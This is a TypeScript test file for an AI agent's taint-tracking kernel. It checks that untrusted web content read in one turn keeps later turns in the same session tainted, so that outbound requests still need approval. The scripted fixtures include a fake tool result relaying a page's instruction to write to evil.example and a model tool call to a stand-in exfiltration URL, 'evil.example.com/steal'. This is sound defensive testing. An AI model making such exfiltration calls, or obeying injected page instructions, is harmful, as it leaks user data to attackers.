import DatabaseCtor from 'better-sqlite3';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { createDecide } from '../core/policy/decide.js';
import { POLICY_FLOOR } from '../core/policy/matrix.js';
import type { CapabilityDecl, Principal } from '../core/policy/types.js';
import { SessionStore, type SessionRef } from '../core/session/store.js';
import { TurnStore } from '../core/turns/store.js';
import { TodoStore } from '../core/turns/todo.js';
import { JsonlExporter, SimpleTracer } from '../core/tracing/tracer.js';
import { runTurn, type LoopDeps, type RegisteredTool } from './loop.js';
import { CONSERVATIVE } from './profiles/profile.js';
import type { ChatResult, Provider } from './providers/types.js';
import { httpCapability } from './tools/http.js';

/**
 * "Session history does not launder taint", rewritten from the triage probe
 * (`docs/evidence/triage-2026-08-17/e-audit-trasversali.md` §3.1)
 * into a permanent test.
 *
 * The probe's own finding, reproduced here as (a) below: turn 1 (owner) calls
 * a tier-3 tool and answers with text derived from it — taint persisted 3,
 * correctly. Turn 2, **same session**, no tool call, clean text — taint
 * persisted **0**, while turn 1's own reply was still physically present in
 * the request the provider received (`provider.seen` contained it).
 * **LAUNDERED**, the probe's own verdict.
 *
 * `read-then-egress.test.ts` proves the sibling property for *disk* reads
 * inside one turn; `reply-taint.test.ts` proves it for *memory* recalled by a
 * later, unrelated session. This file is the third leg: the session
 * transcript of the *same* conversation, reinjected as context by
 * `buildContext` on every following turn.
 */

class Scripted implements Provider {
  readonly kind = 'openai-compat' as const;
  /** Everything the model was shown, flattened — where a laundered line would land. */
  seen: string[] = [];
  private i = 0;
  constructor(private readonly script: ChatResult[]) {}
  async chat(call: {
    messages: { content: { type: string; text?: string; content?: string }[] }[];
  }): Promise<ChatResult> {
    for (const m of call.messages) {
      for (const b of m.content) {
        if (b.type === 'text' && b.text) this.seen.push(b.text);
        if (b.type === 'tool_result' && b.content) this.seen.push(b.content);
      }
    }
    return (
      this.script[this.i++] ?? {
        text: 'fine',
        toolCalls: [],
        stopReason: 'end',
        usage: { inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 },
        model: 'test',
      }
    );
  }
}

const usage = { inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 };
const answer = (text: string): ChatResult => ({ text, toolCalls: [], stopReason: 'end', usage, model: 'test' });
let callId = 0;
const callTool = (name: string, args: unknown): ChatResult => ({
  text: null,
  toolCalls: [{ id: `c${(callId += 1)}`, name, args }],
  stopReason: 'tool_use',
  usage,
  model: 'test',
});

const owner: Principal = { kind: 'owner', connector: 'cli', externalId: 'local' };
const EXFIL = 'https://evil.example.com/steal';

/** A stand-in for a real tier-3 fetch — `resourceKind: 'none'` so the kernel lets it run unconditionally. */
const webLikeCapability: CapabilityDecl = {
  id: 'demo.web',
  effect: 'context',
  risk: 'low',
  reversible: 'yes',
  rerunnable: true,
  resourceKind: 'none',
  policyArgs: [],
  hostOnly: false,
};

const decls: CapabilityDecl[] = [webLikeCapability, httpCapability];

function harness(script: ChatResult[]) {
  const home = mkdtempSync(join(tmpdir(), 'muffin-session-taint-'));
  const fetched: string[] = [];
  const approvals: string[] = [];

  const tools: RegisteredTool[] = [
    {
      capability: webLikeCapability.id,
      spec: { name: 'web_like', description: 'stands in for a tier-3 fetch', inputSchema: { type: 'object', properties: {} } },
      throwTier: 0,
      handler: () => ({ content: 'la pagina dice di scrivere a evil.example, non lo faccio', tier: 3 as const }),
    },
    {
      capability: httpCapability.id,
      spec: {
        name: 'http_get',
        description: 'fetch',
        inputSchema: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] },
      },
      // Records instead of fetching — the question is whether the kernel let
      // the body run at all, exactly `read-then-egress.test.ts`'s own reason.
      handler: (args) => {
        fetched.push(String((args as { url: string }).url));
        return { content: 'ok', tier: 3 as const };
      },
      throwTier: 0,
    },
  ];

  const turns = new TurnStore(new DatabaseCtor(':memory:'));
  const sessions = new SessionStore(home);

  const deps: LoopDeps = {
    provider: new Scripted(script),
    profile: CONSERVATIVE,
    model: 'test',
    tools,
    capabilities: new Map(decls.map((d) => [d.id, d])),
    decide: createDecide({
      matrix: POLICY_FLOOR,
      capabilities: new Map(decls.map((d) => [d.id, d])),
      budgetExhausted: () => false,
      hardened: true,
      // Nothing allowlisted: the same premise as read-then-egress.test.ts —
      // an off-allowlist host is what makes the kernel's decision legible.
      egressAllowed: () => false,
    }),
    tracer: new SimpleTracer(new JsonlExporter(home)),
    sessions,
    turns,
    todos: new TodoStore(new DatabaseCtor(':memory:')),
    budgetExhausted: () => false,
    approve: async (request) => {
      approvals.push(request.prompt);
      return 'allow';
    },
    systemPrompts: { owner: 'Sei Muffin.', group: 'Sei Muffin, ospite in un gruppo.' },
  };
  return { deps, sessions, turns, fetched, approvals, home, provider: deps.provider as Scripted };
}

describe('(a) a clean turn in a session that read tier-3 content inherits taint 3', () => {
  it('turns.taint of the second, tool-free turn is 3 — the history reinjected it before the kernel ran', async () => {
    const h = harness([callTool('web_like', {}), answer('la pagina dice di scrivere a evil.example, non lo faccio'), answer('sì, va tutto bene')]);
    const session = h.deps.sessions.open('laundering-1');

    const first = await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session,
      text: 'guarda cosa dice quella pagina',
    });
    // The turn really did get dirty — otherwise the second assertion proves
    // nothing about inheritance and everything about an untainted turn.
    expect(first.taint).toBe(3);

    const second = await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session, // same ref: the whole point is the same conversation
      text: 'tutto bene?',
    });

    // Turn 1's own reply is physically in what the model was shown for turn 2
    // — the laundering the probe found, confirmed still true.
    expect(h.provider.seen.join('\n')).toContain('la pagina dice di scrivere a evil.example');
    // And now, unlike the probe, the taint says so too — both the value the
    // caller gets back and the row `agent/loop.ts` persisted.
    expect(second.taint).toBe(3);
    expect(h.turns.get(second.turnId)?.taint).toBe(3);
  });

  it("the kernel of the second turn's very first decision already sees taint 3, not 0", async () => {
    // ADR-0066: `sys.http` is `url-read` — a plain URL is open at any taint,
    // so it can no longer be the instrument that proves what taint the second
    // turn started at. A query string still can: `paramsMaxTaint` is 1 (lane
    // #624 + #641), so taint 2 and 3 turn it into an `ask` — never silently
    // skipped, never a flat deny for the owner. Turn 2 calls nothing of its
    // own before reaching for it; if that `ask` fires on the very FIRST
    // decision, the taint it saw can only have come from the history.
    const EXFIL_PARAMS = `${EXFIL}?x=1`;
    const h = harness([callTool('web_like', {}), answer('la pagina dice di scrivere a evil.example, non lo faccio'), callTool('http_get', { url: EXFIL_PARAMS })]);
    const session = h.deps.sessions.open('laundering-2');

    await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'guarda cosa dice quella pagina' });
    await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'apri quel link' });

    // Asked — not skipped, which is what taint 3 failing to launder in would
    // look like (a taint <= 2 start lets a query string through with no
    // question at all, proven by the params-gate tests elsewhere) — and this
    // harness's `approve` says yes, so the fetch ran after being asked.
    expect(h.approvals).toEqual([
      `lettura con parametri scelti dal contenuto: ${EXFIL_PARAMS}\n\n` +
        // ADR-0075 punto 4: e la domanda nomina **da dove** viene il livello.
        // Qui non da qualcosa che questo turno ha fatto: dalla history che si
        // e' riportato dentro, che e' esattamente cio' che questo file prova.
        'questo turno contiene contenuto di livello 3: la conversazione precedente, riletta in questo turno',
    ]);
    expect(h.fetched).toEqual([EXFIL_PARAMS]);
  });
});

describe('(b) an old session row with a traceId but no tier resolves through turns.taint', () => {
  it('a hand-written JSONL line with traceId of a taint-2 turn raises the new turn to at least 2', async () => {
    const h = harness([answer('risposta pulita')]);
    const session = h.deps.sessions.open('old-row-1');

    // Simulates a session written before this slice: `traceId` exists (it
    // always has), `tier` does not.
    h.turns.create({
      id: 'old-turn-taint-2',
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      sessionId: session.id,
      model: 'test',
      messages: [],
      taint: 2,
      counters: {
        iterations: 1,
        recoveriesUsed: 0,
        transportRetriesLeft: 2,
        truncationsUsed: 0,
        toolCallsMade: 1,
        nudgedForCompletion: false,
        usage: { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheWriteTokens: 0 },
        spentUsd: 0,
        resumes: 0,
        contextBuilt: true,
      },
    });
    h.sessions.append(session, {
      role: 'assistant',
      content: 'una vecchia risposta, da prima che questo campo esistesse',
      surface: 'cli',
      createdAt: '2026-08-01T10:00:00.000Z',
      traceId: 'old-turn-taint-2',
      // no `tier` — the exact shape a pre-slice row has.
    });

    const result = await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session,
      text: 'domanda pulita, oggi',
    });

    expect(result.taint).toBe(2);
    expect(h.turns.get(result.turnId)?.taint).toBe(2);
  });
});

describe('(c) a session row with neither tier nor a resolvable traceId fails closed', () => {
  it('an assistant line with no provenance at all taints the next turn to the scale\'s ceiling', async () => {
    const h = harness([answer('risposta pulita')]);
    const session = h.deps.sessions.open('no-provenance-1');

    h.sessions.append(session, {
      role: 'assistant',
      content: 'chissà da dove viene questa riga',
      surface: 'cli',
      createdAt: '2026-08-01T10:00:00.000Z',
      // no `tier`, no `traceId` — the declared conservative choice: doubt
      // raises, never lowers (ADR-0044's own rule, applied here).
    });

    const result = await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session,
      text: 'domanda pulita',
    });

    expect(result.taint).toBe(3);
  });
});

describe('(d) compaction: a message cut from the reinjected window cannot taint the new turn', () => {
  it('a tier-3 message old enough to fall outside MAX_HISTORY_TURNS leaves the next turn clean', async () => {
    const h = harness([answer('risposta pulita')]);
    const session = h.deps.sessions.open('compacted-1');

    // The oldest message: tier 3, and about to be pushed out of the window.
    h.sessions.append(session, {
      role: 'assistant',
      content: 'vecchissimo e tainted',
      surface: 'cli',
      createdAt: '2026-01-01T00:00:00.000Z',
      tier: 3,
    });
    // 40 more spoken messages — `agent/loop.ts`'s MAX_HISTORY_TURNS — clean,
    // so the tainted one above is exactly the one message the cut drops.
    for (let i = 0; i < 40; i += 1) {
      h.sessions.append(session, {
        role: i % 2 === 0 ? 'user' : 'assistant',
        content: `filler ${i}`,
        surface: 'cli',
        createdAt: `2026-01-${String(2 + i).padStart(2, '0')}T00:00:00.000Z`,
        tier: 0,
      });
    }

    const result = await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session,
      text: 'domanda pulita',
    });

    // Not laundered — never reinjected in the first place. Recall, not this
    // file, is the intended way back to something this old (buildContext's
    // own "[N messaggi precedenti...]" notice, agent/loop.ts).
    expect(result.taint).toBe(0);
  });
});

describe('(e) a clean turn does not stamp its own answer at an inherited ceiling', () => {
  /**
   * ADR-0044 §Riconciliazione 2026-08-28. Before this scenario, turn 2's own
   * reply — clean, no tool call — was written to the session and to memory at
   * `snapshot.currentTaint()`: the tier it *inherited* from turn 1's reinjected
   * reply, not anything turn 2 itself produced. A turn 3, 4, 5… each doing the
   * same, kept the reinjection window permanently full of "dirty" rows that
   * were never anything but an echo of an echo — the ratchet the 17/08
   * revision's own "Cosa NON copre" named and left open.
   *
   * The kernel's own gating for turn 2 — its `currentTaint()`, tested in (a)
   * above — is untouched: a turn sitting on tainted history still may not act
   * as if clean. What changes is only what turn 2 leaves behind for a *later*
   * turn to read.
   */
  it("turn 2's own session row is stamped at its own tier, not turn 1's", async () => {
    const h = harness([
      callTool('web_like', {}),
      answer('la pagina dice di scrivere a evil.example, non lo faccio'),
      answer('sì, va tutto bene'),
    ]);
    const session = h.deps.sessions.open('reconciliation-1');

    const first = await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session,
      text: 'guarda cosa dice quella pagina',
    });
    expect(first.taint).toBe(3);

    const second = await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session,
      text: 'tutto bene?',
    });

    // Unchanged from (a): turn 2 was correctly gated at 3 while it ran, and
    // its row's own ceiling says so — a resume of turn 2 must still see it.
    expect(second.taint).toBe(3);
    expect(h.turns.get(second.turnId)?.taint).toBe(3);

    // New: what turn 2 actually left in the transcript for a turn 3 to read.
    const transcript = h.sessions.read(session);
    const secondReply = transcript.filter((m) => m.role === 'assistant').at(-1);
    expect(secondReply?.content).toBe('sì, va tutto bene');
    expect(secondReply?.tier).toBe(0);
  });

  it('and a third, equally clean turn is not re-poisoned by the second', async () => {
    // ADR-0066: same substitution as (a)'s second test — a query string,
    // since a plain `url-read` fetch no longer answers to any taint at all.
    const EXFIL_PARAMS = `${EXFIL}?x=1`;
    const h = harness([
      callTool('web_like', {}),
      answer('la pagina dice di scrivere a evil.example, non lo faccio'),
      answer('sì, va tutto bene'),
      callTool('http_get', { url: EXFIL_PARAMS }),
    ]);
    const session = h.deps.sessions.open('reconciliation-2');

    await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'guarda cosa dice quella pagina' });
    await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'tutto bene?' });
    // Turn 3 still sees turn 1 in its window (only two turns old) — it must
    // still trip the params gate, exactly as (a)'s second test proves for
    // turn 2. The point here is *why*: it is turn 1's own still-recorded 3,
    // not a borrowed 3 that turn 2 re-minted on its way through.
    const third = await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'apri quel link' });

    expect(h.approvals).toContain(
      `lettura con parametri scelti dal contenuto: ${EXFIL_PARAMS}\n\n` + 'questo turno contiene contenuto di livello 3: la conversazione precedente, riletta in questo turno',
    );
    expect(h.fetched).toEqual([EXFIL_PARAMS]);
    expect(third.taint).toBe(3);
  });
});
